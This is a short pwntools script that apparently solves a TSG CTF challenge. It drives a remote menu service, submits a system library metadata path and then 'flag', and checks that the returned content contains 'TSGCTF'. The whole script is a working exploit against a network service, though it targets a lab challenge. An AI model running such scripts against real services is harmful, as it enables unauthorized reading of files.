from pwn import *
import sys

host = sys.argv[1]
port = int(sys.argv[2])

io = remote(host, port)

io.recvuntil(b">")
io.sendline(b"1")
io.recvuntil(b">")
io.sendline(b"1")
io.recvuntil(b">")
io.sendline(b"/var/lib/dpkg/info/libdb5.3t64:amd64.shlibs")

io.recvuntil(b">")
io.sendline(b"1")
io.recvuntil(b">")
io.sendline(b"1")
io.recvuntil(b">")
io.sendline(b"flag")
io.recvuntil(b"content: ")
flag = io.recvline()

if b"TSGCTF" in flag:
    print(flag)
    exit(0)
else:
    exit(1)
